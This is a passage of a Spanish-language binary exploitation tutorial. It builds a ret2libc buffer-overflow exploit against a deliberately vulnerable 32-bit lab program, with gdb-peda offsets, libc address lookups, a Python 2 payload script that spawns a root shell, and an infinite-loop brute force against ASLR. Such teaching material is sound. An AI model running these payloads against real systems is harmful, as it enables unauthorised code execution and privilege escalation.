<code><span class="s2">❯ gcc </span><span class="p">example.c -m32 -fno-stack-protector -no-pie -o example</span><span class="p">
example.c: In function ‘main’:
example.c:4:5: </span><span class="k">warning:</span><span class="p"> implicit declaration [</span><span class="k">-Wimplicit-function-declaration</span><span class="p">]
    4 |     </span><span class="k">copier</span><span class="p">(argv[1]);
      |     </span><span class="k">^~~~~~</span><span class="p">

</span><span class="s2">❯ ls</span><span class="p">
 example   example.c

</span><span class="s2">❯ ./example </span><span class="p">test
Buffer Overflow!</span>
</code></pre></div></div><br>

<div><p>Al mirarlo con checksec podemos ver que todo esta deshabilitado pero NX esta habilitado</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ checksec </span><span class="p">example  
[</span><span class="na">*</span><span class="p">] '/root/example'
    Arch:     </span><span class="no">i386-32-little</span><span class="p">
    RELRO:    </span><span class="kd">Partial RELRO</span><span class="p">
    Stack:    </span><span class="kd">No canary found</span><span class="p">
    NX:       </span><span class="s2">NX enabled</span><span class="p">
    PIE:      </span><span class="kd">No PIE (0x8048000)</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Que es el NX exactamente?</p></div></strong>
<div><p>NX o No Execution es una protección que no nos permite ejecutar codigo en la pila, ¿que quiere decir? cuando esta habilitado nos es imposible inyectar un shellcode como hicimos antes y esperar que se ejecute, ya que no va a pasar</p></div></blockquote><br>

<div><p>La idea es realizar un ret2libc, que consiste en llamar a direcciones propias de libc para ejecutar algo a nivel de sistema, en este caso una '/bin/sh'</p></div>

<div><p>La parte inicial es igual, usar gdb con patrones especiales para conseguir el offset para llegar a EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb</span><span class="p"> -q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$ </span><span class="p">pattern_arg 200
Set 1 arguments to program
</span><span class="kd">gdb-peda$ </span><span class="p">run
Starting program: </span><span class="s2">./example </span><span class="p">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".

Program received signal SIGSEGV, Segmentation fault.

</span><span class="na">[----------------------------------registers-----------------------------------]
</span><span class="s2">EAX</span><span class="p">: </span><span class="na">0xffffd5d0 </span><span class="p">("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EBX</span><span class="p">: 0x6c414150 ('PAAl')
</span><span class="s2">ECX</span><span class="p">: </span><span class="na">0xffffd9c0 </span><span class="p">("AZAAxAAyA")
</span><span class="s2">EDX</span><span class="p">: </span><span class="na">0xffffd68f </span><span class="p">("AZAAxAAyA")
</span><span class="s2">ESI</span><span class="p">: </span><span class="s2">0x804bf04 </span><span class="p">--> </span><span class="kd">0x8049130 </span><span class="p">(&lt__do_global_dtors_aux>:	endbr32)
</span><span class="s2">EDI</span><span class="p">: </span><span class="s2">0xf7ffcb80 </span><span class="p">--> 0x0 
</span><span class="s2">EBP</span><span class="p">: 0x41514141 ('AAQA')
</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xffffd660</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EIP</span><span class="p">: 0x41416d41 ('AmAA')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN </span><span class="s2">trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)</span><span class="na">
[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x41416d41</span><span class="na">
[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd660 </span><span class="p">("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| </span><span class="na">0xffffd664 </span><span class="p">("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| </span><span class="na">0xffffd668 </span><span class="p">("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| </span><span class="na">0xffffd66c </span><span class="p">("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| </span><span class="na">0xffffd670 </span><span class="p">("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| </span><span class="na">0xffffd674 </span><span class="p">("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| </span><span class="na">0xffffd678 </span><span class="p">("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| </span><span class="na">0xffffd67c </span><span class="p">("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")</span><span class="na">
[------------------------------------------------------------------------------]
</span><span class="p">Legend:</span><span class="kd"> code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="na">
0x41416d41 </span><span class="p">in</span><span class="no"> ??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span><span class="p"> pattern_offset 0x41416d41
1094806849 found at offset: </span><span class="na">140</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Empezamos con el script esta vez el junk es directamente 'A' por los bytes del offset</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset</span>
</code></pre></div></div><br>

<div><p>La idea del ret2libc se trata de los siguientes valores, que se obtienen de libc directamente</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">junk + system + exit + /bin/sh</span>
</code></pre></div></div><br>

<div><p>Con ldd pasandole el binario vulnerable podemos ver la ruta de libc y su direccion base</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ldd </span><span class="p">example
	linux-gate.so.1 (0xf7fc7000)
	libc.so.6 => </span><span class="kd">/lib32/libc.so.6</span><span class="p"> (</span><span class="na">0xf7c00000</span><span class="p">)
	/lib/ld-linux.so.2 (0xf7fc9000)</span>
</code></pre></div></div><br>

<div><p>Usando readelf podemos pasarle libc y obtener direcciones de system como de exit</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ readelf </span><span class="p">-s /lib32/libc.so.6 | </span><span class="s2">grep </span><span class="p">-E </span><span class="no">" system@@| exit@@"</span><span class="p">
  1567: </span><span class="na">0003bc40</span><span class="p">    33 FUNC    GLOBAL DEFAULT   15 </span><span class="kd">exit</span><span class="p">@@GLIBC_2.0
  3172: </span><span class="na">0004c7b0</span><span class="p">    55 FUNC    WEAK   DEFAULT   15 </span><span class="kd">system</span><span class="p">@@GLIBC_2.0</span>
</code></pre></div></div><br>

<div><p>Para la cadena '/bin/sh' usaremos strings pasandole libc de igual manera</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ strings </span><span class="p">-a -t x /lib32/libc.so.6 | </span><span class="s2">grep </span><span class="p">/bin/sh 
</span><span class="na"> 1b5faa </span><span class="kd">/bin/sh</span>
</code></pre></div></div><br>

<div><p>Hay que tener en cuenta que estas no son las direcciones reales, para obtener la direccion real hay que sumarle a cada una el valor de libc base que obtuvimos antes, podemos hacerlo con gdb</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q
</span><span class="kd">gdb-peda$ </span><span class="p">p 0xf7c00000 + 0x0004c7b0
$1 = </span><span class="na">0xf7c4c7b0</span><span class="c1">  # system
</span><span class="kd">gdb-peda$ </span><span class="p">p 0xf7c00000 + 0x0003bc40
$2 = </span><span class="na">0xf7c3bc40</span><span class="c1">  # exit
</span><span class="kd">gdb-peda$ </span><span class="p">p 0xf7c00000 + 0x1b5faa
$3 = </span><span class="na">0xf7db5faa</span><span class="c1">  # /bin/sh
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Como estamos en little endian hay que darle vuelta a todas las direcciones conseguidas</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xf7c4c7b0</span><span class="p">     -->     </span><span class="na">\xf7\xc4\xc7\xb0</span><span class="p">     -->     </span><span class="na">\xb0\xc7\xc4\xf7</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xf7c3bc40</span><span class="p">     -->     </span><span class="na">\xf7\xc3\xbc\x40</span><span class="p">     -->     </span><span class="na">\x40\xbc\xc3\xf7</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xf7db5faa</span><span class="p">     -->     </span><span class="na">\xf7\xdb\x5f\xaa</span><span class="p">     -->     </span><span class="na">\xaa\x5f\xdb\xf7</span>
</code></pre></div></div><br>

<div><p>Agregamos las variables de las direcciones obtenidas en el script y lo printeamos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset

addr_system </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xb0\xc7\xc4\xf7"</span><span class="p">

addr_exit </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x40\xbc\xc3\xf7"</span><span class="p">

addr_bin_sh </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xaa\x5f\xdb\xf7"</span><span class="p">

</span><span class="k">print</span><span class="p">(junk</span><span class="kd"> + </span><span class="p">addr_system</span><span class="kd"> + </span><span class="p">addr_exit</span><span class="kd"> + </span><span class="p">addr_bin_sh)</span>
</code></pre></div></div><br>

<div><p>Al ejecutar el script nos deberia otorgar una sh, hemos bypasseado el NX</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ./example </span><span class="k">$(</span><span class="s2">python2 </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">
# whoami
root
#</span>
</code></pre></div></div><br>

<div><strong><h3>Bypass NX Enabled + ASLR Enabled (ret2libc)</h3></strong></div><br>

<div><p>Imaginemos que tenemos la misma situación de antes, el NX habilitado, pero también el ASLR</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ echo</span><span class="p"> 2 |</span><span class="s2"> sudo tee </span><span class="p">/proc/sys/kernel/randomize_va_space
</span>
</code></pre></div></div><br>

<div><p>Ahora tenemos un problema, cuando listamos el valor de libc base mas de una vez podemos ver que es dinamico y cambia cada vez que lo ejecutamos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ldd </span><span class="p">example | </span><span class="s2">grep </span><span class="p">libc | </span><span class="s2">awk </span><span class="no">'{print $4}'</span><span class="p"> | tr </span><span class="p">-d</span><span class="no"> '()'</span><span class="p">
0xf7c00000

</span><span class="s2">❯ ldd </span><span class="p">example | </span><span class="s2">grep </span><span class="p">libc | </span><span class="s2">awk </span><span class="no">'{print $4}' </span><span class="p">|</span><span class="s2"> tr</span><span class="p"> -d</span><span class="no"> '()' </span><span class="p">
0xf7c7ff00</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Cúal es el problema con que la dirección de libc base sea dinamica?</p></div></strong>
<div><p>El problema es que nuestro exploit se basa en esa dirección, por lo que si la suma de libc base con los offsets de los valores definidos es incorrecta, no nos otorgara la sh</p></div></blockquote><br>

<div><p>El siguiente ejemplo muestra que el programa se corrompe sin otorgarnos la shell si es incorrecta</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ./example </span><span class="k">$(</span><span class="s2">python2 </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">
zsh: segmentation fault  ./example $(python2 exploit.py)</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¡Solucion!</p></div></strong>
<div><p>En verdad es bastante simple cuando se trabaja en 32 bits, ya que las direcciones son tan pequeñas que despues de ejecutarlas muchas veces siempre se repetirán por lo que si lo ejecutamos de manera infinita llegara un punto donde libc base valga lo mismo y al programa ejecutarse nos dara la shell</p></div></blockquote><br>

<div><p>Al ejecutarlo mediante un bucle, si libc vuelve a valer lo mismo nos otorga la sh</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ </span><span class="no">while</span><span class="s2"> true</span><span class="p">;</span><span class="no"> do</span><span class="s2"> ./example </span><span class="k">$(</span><span class="s2">python2 </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">;</span><span class="no"> done</span><span class="p">
# whoami
root
#</span>
</code></pre></div></div><br>

<p><a href="./../../">Página Principal</a></p>

      </section>
    </div>
  </body>
</html>
